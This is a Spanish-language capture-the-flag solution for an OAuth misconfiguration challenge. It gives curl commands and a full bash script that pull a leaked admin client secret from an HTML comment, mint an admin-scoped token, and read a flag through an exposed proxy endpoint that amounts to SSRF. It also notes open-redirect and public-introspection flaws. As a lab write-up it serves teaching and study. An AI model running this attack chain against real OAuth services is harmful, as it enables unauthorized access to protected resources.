# Solution: web-oauth-misconfig

## Vulnerability Chain

1. **Credential leak en HTML source** - El HTML de `/` contiene un comentario DEBUG con el secreto
   del cliente admin (`admin_secret_abc`). El equipo de desarrollo olvidó eliminarlo antes del deploy.
2. **Client Credentials flow sin restriccion de red** - El endpoint `/token` acepta el flujo
   `client_credentials` desde cualquier origen. Con el secreto del cliente admin, se puede obtener
   un token con scope `admin` sin autenticacion de usuario.
3. **Resource server accesible via proxy** - El resource-server es interno, pero el auth-server
   expone `/admin/resource?token=&path=` que hace proxy a cualquier ruta del resource-server.
   Esto permite acceder a `/api/flag` usando el token admin.

## Paso 1: Encontrar el secreto del cliente admin

```bash
curl -s http://TARGET:8080/ | grep -i "secret\|debug\|admin"
```

En el HTML source (comentario HTML):
```html
<!--
  DEBUG INFO (eliminar antes de produccion):
  client_admin secret: admin_secret_abc
  client_reader secret: reader_secret_xyz
  TODO: remover esta seccion antes del despliegue en prod
-->
```

## Paso 2: Obtener token admin via Client Credentials

```bash
curl -X POST http://TARGET:8080/token \
  -d "grant_type=client_credentials" \
  -d "client_id=client_admin" \
  -d "client_secret=admin_secret_abc" \
  -d "scope=admin"
```

Respuesta:
```json
{
  "access_token": "cc_xxxxxxxxxxxxxxxxxxxxxxxx",
  "token_type": "Bearer",
  "expires_in": 3600,
  "scope": "admin"
}
```

## Paso 3: Obtener la flag via proxy del auth-server

El resource-server esta en la red interna, pero el auth-server expone un proxy:

```bash
curl "http://TARGET:8080/admin/resource?token=cc_xxxxxxxxxxxxxxxxxxxxxxxx&path=/api/flag"
```

Respuesta:
```json
{
  "flag": "HL4{...}",
  "message": "Acceso autorizado al recurso confidencial",
  "authorized_client": "client_admin",
  "scope": "admin"
}
```

## Alternativa: Verificar el token primero

```bash
# Introspection del token
curl -X POST http://TARGET:8080/token/introspect \
  -d "token=cc_xxxxxxxxxxxxxxxxxxxxxxxx"
# Respuesta muestra scope: "admin"

# Acceder directamente a /api/flag con el token
curl -H "Authorization: Bearer cc_xxxxxxxxxxxxxxxxxxxxxxxx" \
  http://TARGET:8080/admin/resource?path=/api/flag
```

## Script completo (bash)

```bash
TARGET="http://TARGET:8080"

# 1. Extraer secreto del HTML
SECRET=$(curl -s $TARGET/ | grep -oP "client_admin secret: \K[^\s]+")
echo "[+] Admin secret: $SECRET"

# 2. Obtener token admin
TOKEN=$(curl -s -X POST $TARGET/token \
  -d "grant_type=client_credentials" \
  -d "client_id=client_admin" \
  -d "client_secret=$SECRET" \
  -d "scope=admin" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
echo "[+] Admin token: $TOKEN"

# 3. Obtener flag via proxy
curl -s "$TARGET/admin/resource?token=$TOKEN&path=/api/flag" | python3 -m json.tool
```

## Por que funciona

- El comentario HTML `<!-- client_admin secret: admin_secret_abc -->` es visible en el codigo
  fuente de la pagina principal. Cualquier `curl` o `view-source:` lo expone.
- El flujo `client_credentials` no requiere intervencion del usuario, solo las credenciales del
  cliente (client_id + client_secret). Con el secreto correcto, se obtiene un token con scope
  `admin` directamente.
- El endpoint `/admin/resource` fue creado para "testing interno" pero esta expuesto publicamente.
  Permite hacer proxy a cualquier ruta del resource-server usando el token proporcionado.
- El resource-server valida tokens via introspection al auth-server — si el token es valido y
  tiene scope `admin`, devuelve la flag sin restricciones adicionales.

## Vulnerabilidades secundarias

- La validacion de `redirect_uri` para `client_reader` no existe → Open Redirect + auth code theft
- El endpoint `/token/introspect` es publico y no requiere autenticacion del llamador
- El endpoint `/admin/resource` es un SSRF interno controlado por el atacante (path arbitrario)
